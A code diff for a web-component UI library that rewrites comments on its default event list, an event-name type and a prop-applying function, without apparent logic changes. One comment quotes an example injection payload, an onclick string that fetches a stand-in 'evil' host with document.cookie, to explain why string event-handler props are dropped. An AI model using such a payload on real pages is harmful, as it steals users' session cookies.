@@ -8,35 +8,25 @@
  * Every custom event an aparté element dispatches on ITSELF — the set `AparteUi`
  * forwards through its single event output, in all four wrappers.
  *
- * It said "verified against core" while carrying seven of twenty-five, and the gap was
- * not academic: `aparte-model-change` was missing, which is the event the ONE example
- * in the wrappers' own docs exists to receive (`<aparte-ui name="aparte-model-selector"
- * …>`). The documented usage could not hear the thing it was documenting. Re-derived
- * from the generated manifest, which now records every element's events because their
- * docblocks were reattached.
+ * `scripts/check-event-map.mjs` asserts this list against every non-`window` dispatch
+ * in core.
  *
- * A PLUGIN's events are not here either, and `aparte-model-change` was until this line
- * was written. The reason is the same one that keeps plugin tags out of the element
- * registry: this default is core's, and a third-party plugin's author cannot add to it,
- * so listing ours would privilege our packages over theirs. Pass the names you need —
- * `events: ['aparte-model-change']` — which is one line for everyone equally.
+ * A PLUGIN's events are not here, `aparte-model-change` included. The reason is the
+ * same one that keeps plugin tags out of the element registry: this default is core's,
+ * and a third-party plugin's author cannot add to it, so listing ours would privilege
+ * our packages over theirs. Pass the names you need — `events: ['aparte-model-change']`
+ * — which is one line for everyone equally.
  *
  * Three events are deliberately NOT here for a different reason: `aparte-abort`,
  * `aparte-compact` and `aparte-config-change` go out through `window.dispatchEvent` —
  * they concern the whole page, not one subtree — so an element-level listener can never
  * receive them and listing them would promise a forward that cannot happen.
  *
- * `aparte-message-aborted` used to be named in that sentence, and it was wrong.
- * `dispatchLifecycleEvent` dispatches it — with the other four lifecycle events — on the
- * HOST ELEMENT, bubbling and composed (`client/lifecycle-events.ts`), and the composer's
- * `window` dispatch is a SECOND, page-wide broadcast, not the only one. So the proxy
- * could have forwarded it all along, and a wrapper consumer watching a turn end had to
- * reach past `<AparteUi>` to `window` for no reason. The five lifecycle events are here
- * now; the sentence above lists only what a `window` dispatch is the sole path for.
- *
- * `scripts/check-event-map.mjs` now asserts this list against every non-`window`
- * dispatch in core, so "verified against core" is a check rather than a claim — which
- * is what the first version of this docblock said while carrying seven of twenty-five.
+ * The five lifecycle events (including `aparte-message-aborted`) ARE here:
+ * `dispatchLifecycleEvent` dispatches them on the HOST ELEMENT, bubbling and composed
+ * (`client/lifecycle-events.ts`), and the composer's `window` dispatch is a second,
+ * page-wide broadcast, not the only one. The sentence above lists only what a `window`
+ * dispatch is the sole path for.
  */
 export const APARTE_DEFAULT_UI_EVENTS = [
     // <aparte-composer> and its parts
@@ -94,11 +84,10 @@ export const APARTE_DEFAULT_UI_EVENTS = [
  * `as const` rather than `readonly string[]` because a TYPE needs the literals: the
  * Svelte wrapper derives its `on:` surface from `HTMLElementEventMap`, which
  * deliberately omits the five detail-less events (a map entry would type `e.detail` as
- * `null` and gain nothing). That omission was harmless while it only governed
- * `addEventListener`; once the wrapper DECLARED the tags it removed
- * `SvelteHTMLElements`' catch-all index signature, and `on:aparte-cancel` — the stop
- * button — stopped type-checking. This list already knows those five, so it is the
- * honest source for "every event you can listen for".
+ * `null` and gain nothing). Because the wrapper declares the tags, which removes
+ * `SvelteHTMLElements`' catch-all index signature, `on:aparte-cancel` — the stop
+ * button — only type-checks if it is listed. This list knows those five, so it is the
+ * source for "every event you can listen for".
  */
 export type AparteUiEventName = typeof APARTE_DEFAULT_UI_EVENTS[number];
 
@@ -124,18 +113,18 @@ export function applyElementProps(
     for (const [key, value] of Object.entries(props)) {
         if (key.startsWith('--')) {
             /*
-             * `null` / `undefined` REMOVE the property; they used to be stringified.
+             * `null` / `undefined` REMOVE the property; they are not stringified.
              *
              * `props={{ '--aparte-select-bg': theme.selectBg }}` with the field undefined
-             * set the custom property to the token `undefined`. That is strictly worse
-             * than not setting it: because the property is now SET, every
+             * would set the custom property to the token `undefined`. That is strictly worse
+             * than not setting it: because the property would be SET, every
              * `var(--aparte-select-bg, <default>)` in core's stylesheet skips its
              * fallback and becomes invalid at computed-value time, so the declaration is
              * dropped entirely and the control renders unstyled rather than with the
              * theme default. An object came out as `[object Object]` the same way.
              *
-             * Every other branch of this function already removed on null/undefined/false.
-             * This one was the exception, and consumers spread arbitrary prop bags in here.
+             * Every other branch of this function removes on null/undefined/false too, and
+             * consumers spread arbitrary prop bags in here.
              */
             if (value === null || value === undefined) el.style.removeProperty(key);
             else if (typeof value === 'object' || typeof value === 'function') el.style.removeProperty(key);
@@ -152,16 +141,15 @@ export function applyElementProps(
             // Event handlers belong on the wrapper's event forwarding, not here —
             // and this drops them WHATEVER their type.
             //
-            // The guard used to be `&& typeof value === 'function'`, which let a
-            // STRING through to `setAttribute` at the bottom of this chain:
-            // `{ onclick: 'fetch("//evil/?"+document.cookie)' }` became a live
+            // No `typeof value === 'function'` condition: that would let a
+            // STRING through to `setAttribute` at the bottom of this chain, and
+            // `{ onclick: 'fetch("//evil/?"+document.cookie)' }` would become a live
             // inline handler. Consumers spread arbitrary prop bags into
             // `<AparteUi>` (React and Angular both), so those keys are not
             // necessarily authored by the app.
             //
-            // A function was already ignored; ignoring the string too costs a
-            // consumer nothing, because an `on*` string was never a working way to
-            // attach a listener here in the first place.
+            // Ignoring a string costs a consumer nothing, because an `on*` string is
+            // not a working way to attach a listener here.
             el.removeAttribute(key);
         } else if (value === null || value === undefined || value === false) {
             el.removeAttribute(key);
